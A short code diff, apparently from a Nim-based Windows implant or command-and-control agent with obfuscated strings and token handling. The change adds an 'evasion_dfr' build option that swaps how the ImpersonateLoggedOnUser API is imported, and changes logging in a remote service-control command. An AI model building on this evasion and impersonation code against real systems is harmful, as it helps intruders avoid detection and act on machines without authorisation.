@@ -4,7 +4,11 @@ import ../utils/strenc
 import std/[json, strformat, strutils]
 
 when defined(windows):
-  import winim/lean
+  when defined(evasion_dfr):
+    import winim/lean except ImpersonateLoggedOnUser
+    import ../utils/winapi
+  else:
+    import winim/lean
   import token_manager
   
   {.push used.}
@@ -325,7 +329,7 @@ proc sc*(taskId: string, params: JsonNode): JsonNode =
       let service = params[obf("service")].getStr()
       let computer = params.getOrDefault(obf("computer")).getStr("")
       
-      debug &"[DEBUG] sc: action={action}, service={service}, computer={computer}"
+      debugLog "sc", &"sc: action={action}, service={service}, computer={computer}"
       
       var output: string
       case action
